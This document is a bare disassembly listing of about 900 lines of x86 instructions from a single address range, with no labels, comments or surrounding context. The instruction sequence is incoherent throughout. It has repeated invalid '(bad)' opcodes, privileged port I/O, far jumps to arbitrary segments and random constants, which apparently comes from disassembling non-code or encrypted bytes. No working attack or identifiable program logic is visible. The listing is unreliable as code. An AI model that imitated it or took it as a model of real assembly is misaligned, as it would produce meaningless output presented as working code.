  424dae:	sub    bh,BYTE PTR [esi]
  424db0:	retf   
  424db1:	sbb    eax,0xb53d3fd3
  424db6:	xchg   ebp,eax
  424db7:	iret   
  424db8:	or     dl,al
  424dba:	dec    eax
  424dbb:	jmp    0x424e15
  424dbd:	loop   0x424e2f
  424dbf:	pop    es
  424dc0:	mov    ds:0x462da92e,eax
  424dc5:	inc    eax
  424dc6:	repz mov ebp,0x7f1f00f1
  424dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dcd:	gs pop ecx
  424dcf:	js     0x424d57
  424dd1:	daa    
  424dd2:	sbb    al,0xc2
  424dd4:	jmp    0x2275:0x8416f659
  424ddb:	fst    QWORD PTR [edi]
  424ddd:	js     0x424e42
  424ddf:	xor    al,0x66
  424de1:	add    ecx,DWORD PTR [ecx]
  424de3:	loopne 0x424e30
  424de5:	jge    0x424dbc
  424de7:	xchg   edx,eax
  424de8:	jns    0x424da6
  424dea:	adc    DWORD PTR [esi-0xf],edi
  424ded:	dec    eax
  424dee:	cs test al,0x91
  424df1:	shl    BYTE PTR [ebx+0x2e],0xc8
  424df5:	cmp    dl,BYTE PTR [ebx-0x79]
  424df8:	ret    
  424df9:	xor    eax,0x7860982
  424dfe:	and    esp,DWORD PTR ds:0x807c0cf5
  424e04:	in     eax,0x56
  424e06:	xor    BYTE PTR [edx+0x1949d629],al
  424e0c:	add    al,BYTE PTR [ebp+0x41]
  424e0f:	imul   esi,DWORD PTR [ebx-0x80],0x9a45bdf3
  424e16:	iret   
  424e17:	push   esi
  424e18:	jmp    0x424e44
  424e1a:	aam    0x74
  424e1c:	add    eax,0x60bccdc1
  424e21:	jg     0x424df7
  424e23:	jbe    0x424dd8
  424e25:	and    DWORD PTR [ecx],edi
  424e27:	fcmovnb st,st(6)
  424e29:	or     DWORD PTR [edi-0x2f],edi
  424e2c:	test   DWORD PTR [ecx],ebx
  424e2e:	aas    
  424e2f:	into   
  424e30:	xor    DWORD PTR [eax+0x1d],ebp
  424e33:	sbb    BYTE PTR [edx],dh
  424e35:	fsub   DWORD PTR [eax-0x1d]
  424e38:	xlat   BYTE PTR ds:[ebx]
  424e39:	(bad)  
  424e3a:	mov    eax,0xd522d327
  424e3f:	mov    ebx,0xbb72a113
  424e44:	hlt    
  424e45:	out    0xd8,eax
  424e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e48:	jg     0x424e60
  424e4a:	dec    edi
  424e4b:	test   al,0xa3
  424e4d:	out    dx,eax
  424e4e:	jp     0x424ec5
  424e50:	pop    es
  424e51:	retf   0xef0c
  424e54:	popf   
  424e55:	sbb    eax,0x6463c9c7
  424e5a:	js     0x424e2f
  424e5c:	and    eax,0x93929bca
  424e61:	fsub   QWORD PTR ds:[edi-0x5a]
  424e65:	push   eax
  424e66:	arpl   bp,bp
  424e68:	inc    eax
  424e69:	(bad)  
  424e6a:	vcvtsi2sd xmm4,xmm0,DWORD PTR [eax-0x32]
  424e6f:	mov    bh,ah
  424e71:	jp     0x424e4c
  424e73:	(bad)  
  424e74:	out    dx,eax
  424e75:	xchg   edx,eax
  424e76:	out    dx,al
  424e77:	outs   dx,DWORD PTR ds:[esi]
  424e78:	xchg   esi,eax
  424e79:	jo     0x424e1d
  424e7b:	pop    ds
  424e7c:	push   ds
  424e7d:	jae    0x424eb5
  424e7f:	xchg   ecx,eax
  424e80:	test   BYTE PTR [eax+0x1e6f398e],bl
  424e86:	sbb    eax,0x4f7bffd0
  424e8b:	mov    cl,0x4a
  424e8d:	push   eax
  424e8e:	push   ecx
  424e8f:	jne    0x424e43
  424e91:	shl    eax,cl
  424e93:	not    dl
  424e95:	push   es
  424e96:	jge    0x424e2f
  424e98:	pop    eax
  424e99:	and    esp,edi
  424e9b:	pop    edi
  424e9c:	jle    0x424e31
  424e9e:	adc    al,0x4
  424ea0:	retf   0xb387
  424ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ea4:	(bad)  [ecx]
  424ea6:	ja     0x424f0d
  424ea8:	or     DWORD PTR [ebx+0x69388bd8],0xffffffb1
  424eaf:	jo     0x424ec1
  424eb1:	imul   edi,DWORD PTR [ebp-0x3],0x58
  424eb5:	dec    edx
  424eb6:	sub    eax,0x56c2850d
  424ebb:	cmp    BYTE PTR [edx+0x6c4e63c5],dl
  424ec1:	daa    
  424ec2:	xchg   ebp,eax
  424ec3:	leave  
  424ec4:	dec    ebx
  424ec5:	mov    eax,ds:0xf760d8c4
  424eca:	pop    edx
  424ecb:	adc    BYTE PTR [edx-0x3c],ah
  424ece:	mov    bl,0xc1
  424ed0:	adc    esi,ebx
  424ed2:	sub    DWORD PTR [ebx+0xb],esp
  424ed5:	jmp    0x6fe5cec4
  424eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424edb:	inc    edx
  424edc:	(bad)  
  424edd:	dec    edi
  424ede:	mov    ebp,0x3bb5e538
  424ee3:	push   es
  424ee4:	push   0xffffffeb
  424ee6:	or     eax,0xfc729dc0
  424eeb:	fisubr DWORD PTR [esi-0x28]
  424eee:	mov    ah,0x6
  424ef0:	hlt    
  424ef1:	jge    0x424eff
  424ef3:	lods   eax,DWORD PTR ds:[esi]
  424ef4:	call   0xabcb:0x13d6b75
  424efb:	sub    cl,BYTE PTR [esi-0x11da4966]
  424f01:	cdq    
  424f02:	ss pop ss
  424f04:	adc    al,0x89
  424f06:	div    BYTE PTR [edx+0x3e]
  424f09:	xor    al,0x13
  424f0b:	sbb    DWORD PTR [eax+edi*4+0x67],ecx
  424f0f:	cmp    bh,ch
  424f11:	js     0x424f6b
  424f13:	jge    0x424eda
  424f15:	stos   DWORD PTR es:[edi],eax
  424f16:	pop    ecx
  424f17:	not    edx
  424f19:	fidiv  WORD PTR [esp+edi*2]
  424f1c:	int3   
  424f1d:	mov    dl,0x69
  424f1f:	xchg   ebx,eax
  424f20:	lock xor eax,0x55f96409
  424f26:	jecxz  0x424eb0
  424f28:	imul   eax,DWORD PTR [edx],0xffffffae
  424f2b:	mov    ah,0x82
  424f2d:	ror    edi,cl
  424f2f:	sar    BYTE PTR [edx+0x5d3c0117],0x33
  424f36:	push   eax
  424f37:	sbb    DWORD PTR [edx],eax
  424f39:	in     al,0x83
  424f3b:	sbb    eax,0x99add7f8
  424f40:	sub    al,0x8a
  424f42:	jp     0x424fb6
  424f44:	out    dx,eax
  424f45:	push   cs
  424f46:	adc    DWORD PTR ds:0x94b08561,edx
  424f4c:	jmp    0x5ad64cec
  424f51:	cwde   
  424f52:	outs   dx,BYTE PTR ds:[esi]
  424f53:	jbe    0x424f10
  424f55:	sub    edi,DWORD PTR [edi+0x1de25848]
  424f5b:	ror    BYTE PTR [eax+0xa],0x4c
  424f5f:	cmp    DWORD PTR ds:0xaa435200,ebp
  424f65:	sbb    dl,BYTE PTR [ebx+edi*4]
  424f68:	and    DWORD PTR [ecx-0x37],eax
  424f6b:	(bad)  [ebp+0x1e]
  424f6e:	loope  0x424f6f
  424f70:	push   cs
  424f71:	mov    esi,0xb031f2e1
  424f76:	xchg   esi,eax
  424f77:	push   0xde5d2825
  424f7c:	iret   
  424f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f7e:	and    DWORD PTR [ebp-0x5],esp
  424f81:	dec    eax
  424f82:	xor    eax,esi
  424f84:	push   eax
  424f85:	and    BYTE PTR [ebx+0x69b99d88],al
  424f8b:	and    eax,ecx
  424f8d:	pop    esi
  424f8e:	addr16 jmp 0xacd1:0x708b345e
  424f96:	add    dl,ch
  424f98:	inc    ebx
  424f99:	push   edx
  424f9a:	mov    cl,0x28
  424f9c:	mov    ds:0x8ebb0983,eax
  424fa1:	mov    dl,0xbb
  424fa3:	or     dh,dh
  424fa5:	addr16 xchg esp,eax
  424fa7:	jo     0x424f91
  424fa9:	push   cs
  424faa:	mov    ds:0x4ce86fa4,al
  424faf:	shl    eax,1
  424fb1:	push   ds
  424fb2:	mov    ecx,0xa0dcc3fa
  424fb7:	sub    DWORD PTR [esi],0xbd4462cf
  424fbd:	add    eax,0xc4e34150
  424fc2:	xchg   esi,eax
  424fc3:	(bad)  
  424fc4:	arpl   WORD PTR [ebp+edi*4-0x2afcd1a1],cx
  424fcb:	mov    ah,0x1c
  424fcd:	(bad)  
  424fce:	mov    al,ds:0x7977f2a4
  424fd3:	popa   
  424fd4:	aas    
  424fd5:	in     eax,0x9a
  424fd7:	adc    DWORD PTR [ebx],0xffffffbe
  424fda:	stos   DWORD PTR es:[edi],eax
  424fdb:	jge    0x424fd8
  424fdd:	mov    eax,0x914df983
  424fe2:	cmp    ecx,DWORD PTR [esi]
  424fe4:	cmp    esi,DWORD PTR [eax+0x19d92301]
  424fea:	js     0x424ff4
  424fec:	or     BYTE PTR [ecx+0xc03b18d],ch
  424ff2:	into   
  424ff3:	loop   0x424f8d
  424ff5:	mov    eax,0x2395dc9b
  424ffa:	lods   al,BYTE PTR ds:[esi]
  424ffb:	test   eax,0x5e3b3b1f
  425000:	mov    BYTE PTR [edx+0x30],dl
  425003:	in     eax,0xf0
  425005:	add    eax,0xa3ef3279
  42500a:	pop    ds
  42500b:	cmp    BYTE PTR [ebx+edi*4+0x3ac33aeb],bl
  425012:	xor    BYTE PTR ss:[eax-0x5a02d9f7],0x9f
  42501a:	inc    esp
  42501c:	shr    ebp,0xc
  42501f:	adc    BYTE PTR [eax-0x3d873e90],dh
  425025:	xchg   ecx,eax
  425026:	mov    al,ds:0x4ae41d6b
  42502b:	ins    BYTE PTR es:[edi],dx
  42502c:	arpl   di,cx
  42502e:	retf   0xdb7c
  425031:	sbb    eax,0xf6f2041d
  425036:	hlt    
  425037:	fistp  QWORD PTR [edx+0x2c084fb2]
  42503d:	xor    DWORD PTR [ebx+0x655d7a3a],ecx
  425043:	clc    
  425044:	daa    
  425045:	fst    QWORD PTR [edi]
  425047:	xacquire xchg DWORD PTR [edi-0x1d],ebp
  42504b:	push   es
  42504c:	cmp    al,0x8e
  42504e:	mov    al,0x92
  425050:	enter  0xcf3b,0x13
  425054:	or     BYTE PTR [esi+0x1cdbe61d],bl
  42505a:	pop    eax
  42505b:	jmp    0x42500c
  42505d:	pop    ds
  42505e:	jno    0x425058
  425060:	fstp   QWORD PTR [edx+0x4d75c294]
  425066:	add    ch,BYTE PTR [ebp-0x1d]
  425069:	fwait
  42506a:	into   
  42506b:	xlat   BYTE PTR ds:[ebx]
  42506c:	sbb    esp,ebp
  42506e:	dec    edx
  42506f:	mov    cl,0xb3
  425071:	sahf   
  425072:	sar    BYTE PTR [edx+0x7f96a869],1
  425078:	mov    dl,0xd0
  42507a:	imul   esi,DWORD PTR [ecx-0x12eb555c],0x1896c314
  425084:	outs   dx,BYTE PTR ds:[esi]
  425085:	std    
  425086:	xor    eax,0x596afab7
  42508b:	popf   
  42508c:	mov    eax,0xfb8baff8
  425091:	sub    al,0x47
  425093:	or     ah,al
  425095:	into   
  425096:	outs   dx,DWORD PTR ds:[esi]
  425097:	mov    esp,DWORD PTR [ebx+0x5c]
  42509a:	mov    ecx,0x53e3fc72
  42509f:	das    
  4250a0:	les    esp,FWORD PTR [ebp-0x3b9cc81d]
  4250a6:	dec    ebp
  4250a7:	mov    ch,BYTE PTR [ebx+edi*8-0x5f]
  4250ab:	shr    BYTE PTR [ecx+0x1f],0xb
  4250af:	sub    BYTE PTR [eax+0x6c],bh
  4250b2:	fs mov eax,0xc2c4130e
  4250b8:	push   esi
  4250b9:	xchg   BYTE PTR [esi+0x52],al
  4250bc:	push   ss
  4250bd:	mov    BYTE PTR [edx+0x27],ch
  4250c0:	jo     0x42507f
  4250c2:	cmp    BYTE PTR [esp+esi*2+0x759c458c],bl
  4250c9:	mov    dl,0xf9
  4250cb:	(bad)  
  4250cc:	push   esp
  4250cd:	adc    DWORD PTR [ebp-0x25],0x4a8bb2a6
  4250d4:	mov    bl,0x2
  4250d6:	mov    eax,ds:0xfd4ad1ba
  4250db:	sbb    al,0xf7
  4250dd:	sub    DWORD PTR [ebx+ecx*1-0x7e3269ca],esp
  4250e4:	xchg   esp,eax
  4250e5:	ret    0x5844
  4250e8:	push   cs
  4250e9:	inc    ebp
  4250ea:	outs   dx,BYTE PTR ds:[esi]
  4250eb:	test   eax,0x85b78ea9
  4250f0:	out    dx,eax
  4250f1:	sub    ah,dl
  4250f3:	sahf   
  4250f4:	mov    esp,0xeafba898
  4250f9:	push   edx
  4250fa:	xor    ebp,DWORD PTR [ecx+esi*4]
  4250fd:	jb     0x425117
  4250ff:	data16 and bh,dl
  425102:	cmc    
  425103:	lds    ebp,FWORD PTR [ebp+edi*4-0x6e]
  425107:	shl    BYTE PTR [ebx+eiz*4],1
  42510a:	ins    DWORD PTR es:[edi],dx
  42510b:	push   0xd8db23fb
  425110:	jle    0x425123
  425112:	aas    
  425113:	bound  esi,QWORD PTR [ecx+0x91e74f4]
  425119:	(bad)  
  42511b:	in     al,0xc8
  42511d:	lock jb 0x42513e
  425120:	pop    ebp
  425121:	aas    
  425122:	pop    ebp
  425123:	(bad)  
  425124:	inc    edi
  425125:	and    ch,BYTE PTR [ebx+0x6d4ab019]
  42512b:	rcl    DWORD PTR [esi+0x11667226],0x7a
  425132:	test   BYTE PTR [ebx],bl
  425134:	out    dx,al
  425135:	jmp    0x4250b8
  425137:	mov    edx,0x1ed511b4
  42513c:	xchg   esp,eax
  42513d:	add    esp,ecx
  42513f:	cld    
  425140:	sub    al,0x3f
  425142:	pop    esp
  425143:	mov    cl,0x6f
  425145:	arpl   ax,sp
  425147:	sbb    ch,BYTE PTR [edx+0x2d]
  42514a:	test   eax,0x24340bb8
  42514f:	int    0x67
  425151:	enter  0xa19f,0xe7
  425155:	mov    BYTE PTR ds:0x7d8f3a46,cl
  42515b:	lahf   
  42515c:	cdq    
  42515d:	adc    cl,0xf4
  425160:	jl     0x425170
  425162:	push   ebx
  425163:	or     edx,ebp
  425165:	adc    eax,0xd3fa4c76
  42516a:	adc    BYTE PTR [eax],bh
  42516c:	in     al,0x4f
  42516e:	aam    0x82
  425170:	je     0x42512c
  425172:	jnp    0x425167
  425174:	pop    ss
  425175:	retf   
  425176:	scas   eax,DWORD PTR es:[edi]
  425177:	jge    0x42510f
  425179:	push   edi
  42517a:	xchg   ebx,eax
  42517b:	dec    ebp
  42517c:	frstor ds:0xd65db021
  425182:	sbb    eax,0x2db2443e
  425187:	lods   eax,DWORD PTR ds:[esi]
  425188:	pop    es
  425189:	mov    edi,0xf5f2cae2
  42518e:	cmp    dh,ah
  425190:	lock dec eax
  425192:	jae    0x42516f
  425194:	mov    cl,0x8b
  425196:	xor    DWORD PTR [eax],eax
  425198:	jecxz  0x42513b
  42519a:	and    BYTE PTR es:[esi-0x6dde574b],bh
  4251a1:	mov    ch,0x3f
  4251a3:	out    dx,al
  4251a4:	fiadd  WORD PTR [edx-0x53]
  4251a7:	jge    0x425157
  4251a9:	jb     0x425151
  4251ab:	scas   eax,DWORD PTR es:[edi]
  4251ac:	sahf   
  4251ad:	fmulp  st(3),st
  4251af:	out    dx,al
  4251b0:	pop    edx
  4251b1:	dec    edi
  4251b2:	add    BYTE PTR [esi+0x31120ae8],dh
  4251b8:	or     eax,0x14319778
  4251bd:	je     0x42522a
  4251bf:	dec    edx
  4251c0:	jo     0x42517f
  4251c2:	sti    
  4251c3:	aaa    
  4251c4:	shl    esi,cl
  4251c6:	das    
  4251c7:	mul    BYTE PTR [ebx+0x391338ea]
  4251cd:	call   0x8df539a0
  4251d2:	jb     0x4251e9
  4251d4:	pusha  
  4251d5:	and    eax,0xf0f0dc2f
  4251da:	or     al,0xf9
  4251dc:	add    DWORD PTR [edi],0xffffff8c
  4251df:	ror    DWORD PTR [esi+0xb],0x5
  4251e3:	mov    WORD PTR [edi+0x7903b076],gs
  4251e9:	pop    ecx
  4251ea:	or     DWORD PTR [ebp-0x42b8d0c6],ebp
  4251f0:	dec    ebx
  4251f1:	out    dx,eax
  4251f2:	ret    
  4251f3:	dec    esp
  4251f4:	cdq    
  4251f5:	shl    BYTE PTR [esi+0x21],0xeb
  4251f9:	xor    BYTE PTR [esi+0x5f61007],dh
  4251ff:	dec    esp
  425200:	hlt    
  425201:	stos   BYTE PTR es:[edi],al
  425202:	fs mov esp,0x3bb19386
  425208:	xchg   ebp,eax
  425209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42520a:	add    al,0x6
  42520c:	mov    bl,BYTE PTR [esi]
  42520e:	outs   dx,BYTE PTR ds:[esi]
  42520f:	add    al,0x7e
  425211:	add    al,0xb2
  425213:	cli    
  425214:	test   BYTE PTR [ecx+0x15],cl
  425217:	retf   
  425218:	pusha  
  425219:	(bad)  
  42521a:	and    al,0xc1
  42521c:	cmp    al,0x82
  42521e:	push   edx
  42521f:	bound  edx,QWORD PTR [edi+0x52]
  425222:	iret   
  425223:	shl    ebp,1
  425225:	fist   WORD PTR [edx+0xd81e3a7]
  42522b:	in     eax,0x75
  42522d:	cmp    ebp,edx
  42522f:	ja     0x4251f9
  425231:	adc    eax,ecx
  425233:	stos   BYTE PTR es:[edi],al
  425234:	and    BYTE PTR [esi-0x40f01f0],0xf0
  42523b:	adc    eax,0x85d8829
  425240:	ret    
  425241:	cmp    edx,DWORD PTR [ecx]
  425243:	into   
  425244:	lds    edi,FWORD PTR [ebx]
  425246:	icebp  
  425247:	mov    bl,0xff
  425249:	lods   al,BYTE PTR ds:[esi]
  42524a:	call   0x9041:0xde7d4175
  425251:	jle    0x4251f1
  425253:	scas   al,BYTE PTR es:[edi]
  425254:	lahf   
  425255:	fld    QWORD PTR [ebx]
  425257:	pop    esi
  425258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425259:	or     BYTE PTR [eax+0x3c],dh
  42525c:	test   BYTE PTR [edi+0x5450c84d],ch
  425262:	jle    0x425216
  425264:	xlat   BYTE PTR ds:[ebx]
  425265:	sti    
  425266:	test   al,0xe
  425268:	test   al,0x4a
  42526a:	outs   dx,DWORD PTR ds:[esi]
  42526b:	sub    ah,BYTE PTR [ecx-0x6f]
  42526e:	cmp    DWORD PTR [edi+0x19],esi
  425271:	outs   dx,BYTE PTR ds:[esi]
  425272:	xchg   DWORD PTR [edx+0x250e900e],ebp
  425278:	mov    edi,0x8a257cf1
  42527d:	lods   al,BYTE PTR ds:[esi]
  42527e:	aas    
  42527f:	fsubr  QWORD PTR ds:0x61356751
  425285:	and    eax,eax
  425287:	and    DWORD PTR [ebx+0x1b],eax
  42528a:	jne    0x4252ea
  42528c:	mov    cl,0xc1
  42528e:	lods   eax,DWORD PTR ds:[esi]
  42528f:	test   ah,0xcd
  425292:	ror    DWORD PTR [eax-0x49],cl
  425295:	addr16 jl 0x425237
  425298:	pop    edx
  425299:	lods   al,BYTE PTR ds:[esi]
  42529a:	cli    
  42529b:	stc    
  42529c:	popf   
  42529d:	or     BYTE PTR [esi+0x24698f2],bl
  4252a3:	neg    DWORD PTR [esi+0x2c]
  4252a6:	mov    ds:0x1a886e1c,eax
  4252ab:	jns    0x42523d
  4252ad:	jp     0x42523f
  4252af:	xor    al,0xfa
  4252b1:	sub    ch,bl
  4252b3:	cli    
  4252b4:	pop    eax
  4252b5:	mov    esp,0x96f38032
  4252ba:	ins    BYTE PTR es:[edi],dx
  4252bb:	in     al,dx
  4252bc:	cli    
  4252bd:	fwait
  4252be:	mov    ecx,DWORD PTR [edx]
  4252c0:	xor    BYTE PTR [ebx+0x85cef3e],bl
  4252c6:	into   
  4252c7:	adc    ah,BYTE PTR [edi-0x611a2e99]
  4252cd:	pushf  
  4252ce:	retf   0x8bfc
  4252d1:	push   ecx
  4252d2:	lds    ebp,FWORD PTR [edi]
  4252d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252d5:	lds    edx,FWORD PTR [edi+ecx*8-0x11460b3f]
  4252dc:	mov    dh,0x58
  4252de:	jne    0x425261
  4252e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4252e1:	sahf   
  4252e2:	pop    edx
  4252e3:	pop    ebp
  4252e4:	retf   
  4252e5:	ror    DWORD PTR ds:0xf3ef3f73,cl
  4252eb:	arpl   dx,si
  4252ed:	and    ebp,DWORD PTR [esi+0x6]
  4252f0:	or     al,0xa6
  4252f2:	test   BYTE PTR [esi],bl
  4252f4:	imul   eax,DWORD PTR [edi-0x775d45b3],0x7e7461e
  4252fe:	cld    
  4252ff:	push   0xffffffb4
  425301:	in     al,dx
  425302:	mov    edi,DWORD PTR [edi+0x67]
  425305:	out    dx,eax
  425306:	hlt    
  425307:	cld    
  425308:	mov    edi,DWORD PTR [ebx-0x6]
  42530b:	loope  0x425386
  42530d:	sbb    BYTE PTR [esi],dl
  42530f:	cdq    
  425310:	sbb    bh,BYTE PTR [esi]
  425312:	sti    
  425313:	lods   eax,DWORD PTR ds:[esi]
  425314:	inc    esi
  425315:	ins    DWORD PTR es:[edi],dx
  425316:	js     0x4252c0
  425318:	imul   eax,DWORD PTR [ecx+0x5603eca9],0x5551169
  425322:	xlat   BYTE PTR ds:[ebx]
  425323:	push   ebp
  425324:	mov    ebx,0x1c324929
  42532a:	cmp    eax,0xc16f4224
  42532f:	int    0x66
  425331:	lea    esp,[edi]
  425333:	rcr    DWORD PTR [ecx+eax*1+0x6935bda7],0xf9
  42533b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42533c:	(bad)  [eax]
  42533f:	retf   
  425340:	sub    ebp,esi
  425342:	ret    0x438
  425345:	xor    BYTE PTR ds:0x35ed8481,cl
  42534b:	je     0x4253bc
  42534d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42534e:	xchg   ecx,eax
  42534f:	push   eax
  425350:	lods   eax,DWORD PTR ds:[esi]
  425351:	popa   
  425352:	or     eax,0x688ae349
  425357:	lock dec ebp
  425359:	sub    BYTE PTR [ebx-0x57],dl
  42535c:	inc    esp
  42535d:	adc    ecx,esi
  42535f:	lods   eax,DWORD PTR ds:[esi]
  425360:	xchg   ebx,eax
  425361:	mov    edi,0xf16ad2d2
  425366:	xchg   ecx,eax
  425367:	mov    esi,0x981371dc
  42536c:	fs jns 0x425319
  42536f:	ds push ecx
  425371:	cmp    dh,0x76
  425374:	mov    dl,0x56
  425376:	idiv   BYTE PTR [esi]
  425378:	mov    dl,0x66
  42537a:	popf   
  42537b:	sub    BYTE PTR [esi+0xb],dh
  42537e:	lock sbb ebp,DWORD PTR [edx+0x291d89a0]
  425385:	jmp    0xe0bb:0x19ac75a0
  42538c:	mov    ecx,0x10639ed
  425391:	in     al,dx
  425392:	packuswb mm0,mm1
  425395:	push   ecx
  425396:	xchg   BYTE PTR [edi-0x6d],bh
  425399:	rcr    esi,0x17
  42539c:	mov    bh,0xe9
  42539e:	and    DWORD PTR [eax+edi*4+0x379593ef],ecx
  4253a5:	popf   
  4253a6:	mov    bl,0xf
  4253a8:	or     BYTE PTR [ecx],ah
  4253aa:	shl    BYTE PTR [ebx],cl
  4253ac:	rcr    DWORD PTR [ecx],cl
  4253ae:	into   
  4253af:	mov    ds:0xe5cd51ee,eax
  4253b4:	jns    0x425388
  4253b6:	mov    al,ds:0x7c180ec9
  4253bb:	inc    eax
  4253bc:	imul   edi,DWORD PTR [eax],0x54880ed2
  4253c2:	sub    BYTE PTR ds:0x1770ddab,cl
  4253c8:	mov    bh,0x6c
  4253ca:	xchg   ebp,eax
  4253cb:	fwait
  4253cc:	adc    edi,DWORD PTR [edi-0x374685ef]
  4253d2:	inc    edx
  4253d3:	cmp    eax,0x3ec44fb5
  4253d8:	into   
  4253d9:	dec    dh
  4253db:	pop    es
  4253dc:	scas   eax,DWORD PTR es:[edi]
  4253dd:	xchg   edi,eax
  4253de:	push   edx
  4253df:	push   ds
  4253e0:	xor    bh,BYTE PTR [edi]
  4253e2:	add    eax,0x9bcdb3b8
  4253e7:	repnz (bad) 
  4253e9:	rcl    esi,1
  4253eb:	xchg   ebx,eax
  4253ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253ed:	call   0x96ce60e3
  4253f2:	lods   eax,DWORD PTR ds:[esi]
  4253f3:	lods   al,BYTE PTR ds:[esi]
  4253f4:	add    eax,ebx
  4253f6:	jo     0x425402
  4253f8:	fwait
  4253f9:	xchg   ecx,eax
  4253fa:	cmp    al,0x25
  4253fc:	mov    edi,0xb1434156
  425401:	push   ds
  425402:	xor    dh,BYTE PTR [ecx]
  425404:	pop    edx
  425405:	rcr    DWORD PTR ds:0x3e299a86,1
  42540b:	push   eax
  42540c:	cmc    
  42540d:	inc    edx
  42540e:	mov    esp,0xc2668437
  425413:	pop    eax
  425414:	mov    dl,ah
  425416:	lods   eax,DWORD PTR ds:[esi]
  425417:	cmp    dl,BYTE PTR [ebx-0x4d]
  42541a:	add    ch,BYTE PTR [edi]
  42541c:	ja     0x42545a
  42541e:	add    DWORD PTR [ebx+0x7d4b3b98],0x6a
  425425:	(bad)  
  425426:	mov    eax,0x8a4eda28
  42542b:	mov    WORD PTR [ebx],es
  42542d:	jbe    0x42544f
  42542f:	dec    edi
  425430:	mov    eax,ds:0x47574eaf
  425435:	mov    al,ds:0x3a339af2
  42543a:	sub    BYTE PTR ds:0xe06718eb,bh
  425440:	test   al,0x3
  425442:	scas   eax,DWORD PTR es:[edi]
  425443:	xchg   esp,eax
  425444:	sbb    eax,0xd7108652
  425449:	inc    edx
  42544a:	jne    0x42540e
  42544c:	pushf  
  42544d:	jne    0x425485
  42544f:	jbe    0x42543b
  425451:	jns    0x425488
  425453:	loop   0x425428
  425455:	xchg   DWORD PTR [esi+0x12],esp
  425458:	ins    BYTE PTR es:[edi],dx
  425459:	fcomp  DWORD PTR [esp+eax*2]
  42545c:	popf   
  42545d:	rol    BYTE PTR [edx-0x52a1edc1],0xc2
  425464:	cld    
  425465:	add    eax,DWORD PTR [esi+0x564edd6c]
  42546b:	idiv   edi
  42546d:	sub    DWORD PTR [esi],edx
  42546f:	imul   eax,DWORD PTR [eax+0x3bee15a],0xffffffd1
  425476:	mov    esi,0x1214a850
  42547b:	adc    dl,BYTE PTR [ecx-0x6b]
  42547e:	sub    al,0x6c
  425480:	je     0x4254ac
  425482:	repz add DWORD PTR [eax-0x529c9de7],edx
  425489:	adc    ch,BYTE PTR [edx+0xbadd53]
  42548f:	and    al,0x9a
  425491:	and    DWORD PTR [eax],esi
  425493:	jge    0x4254d7
  425495:	pop    esp
  425496:	push   ds
  425497:	aad    0x91
  425499:	in     al,dx
  42549a:	(bad)  
  42549b:	jl     0x425517
  42549d:	or     esi,esi
  42549f:	into   
  4254a0:	inc    esp
  4254a1:	mov    edi,ss
  4254a3:	dec    ecx
  4254a4:	push   esi
  4254a5:	pop    esi
  4254a6:	mov    esi,0x498afdb7
  4254ab:	mov    eax,0xb2c1f24a
  4254b0:	ss jge 0x425503
  4254b3:	xor    cx,WORD PTR es:[esi+0x6208275d]
  4254bb:	fisub  WORD PTR [eax]
  4254bd:	sti    
  4254be:	(bad)  
  4254bf:	add    BYTE PTR [ebp-0x524fb22d],dh
  4254c5:	sbb    bh,BYTE PTR [edi+0x25]
  4254c8:	mov    al,0x2d
  4254ca:	adc    DWORD PTR [ecx-0x11a010c7],ebx
  4254d0:	rol    esp,cl
  4254d2:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4254d4:	jb     0x4254c8
  4254d6:	sub    BYTE PTR [esi+0x5d],0xde
  4254da:	and    ebx,edx
  4254dc:	mov    ch,al
  4254de:	imul   edi,DWORD PTR [esi+ecx*8-0x52],0x263072a3
  4254e6:	int    0x50
  4254e8:	sub    dh,BYTE PTR [eax-0x34]
  4254eb:	lds    ebx,FWORD PTR [eax-0x2cba7a4c]
  4254f1:	push   es
  4254f2:	stos   DWORD PTR es:[edi],eax
  4254f3:	fdivr  QWORD PTR [ebx]
  4254f5:	adc    DWORD PTR [edx],esi
  4254f7:	mov    edx,0xa0afd886
  4254fc:	mov    ebp,DWORD PTR [ecx]
  4254fe:	ss scas eax,DWORD PTR es:[edi]
  425500:	inc    esp
  425501:	out    dx,al
  425502:	ror    ah,1
  425504:	mov    WORD PTR [eax+ecx*8+0x3],?
  425508:	dec    ebp
  425509:	das    
  42550a:	ror    esi,0x5e
  42550d:	pop    ebp
  42550e:	leave  
  42550f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425510:	sub    eax,0x2d529872
  425515:	jl     0x425514
  425517:	test   ebx,edx
  425519:	add    al,0x92
  42551b:	jge    0x425517
  42551d:	in     al,0x3f
  42551f:	inc    ebx
  425520:	fisubr DWORD PTR [ebp-0x26c5dfe5]
  425526:	stos   BYTE PTR es:[edi],al
  425527:	loop   0x425528
  425529:	dec    edx
  42552a:	sub    ebp,DWORD PTR [edx]
  42552c:	xlat   BYTE PTR gs:[ebx]
  42552e:	mov    ds:0xad9040eb,eax
  425533:	dec    ecx
  425534:	pop    edx
  425535:	dec    esi
  425536:	add    DWORD PTR [esi],0x37
  425539:	in     eax,0xa7
  42553b:	adc    al,0xe1
  42553d:	addr16 hlt 
  42553f:	sbb    edx,DWORD PTR [esi-0x65d8774a]
  425545:	sub    esp,DWORD PTR [eax-0x31]
  425548:	xchg   ecx,eax
  425549:	fmul   st(0),st
  42554b:	lds    ebx,FWORD PTR [ebp-0x26a098d]
  425551:	outs   dx,BYTE PTR ds:[esi]
  425552:	adc    esp,DWORD PTR [ecx]
  425554:	mov    dh,0xaf
  425556:	test   BYTE PTR [ecx+0x3a],dh
  425559:	pop    edi
  42555a:	ret    
  42555b:	xchg   ecx,eax
  42555c:	int    0x3c
  42555e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42555f:	adc    BYTE PTR [edi-0x9],dh
  425562:	and    ebp,ecx
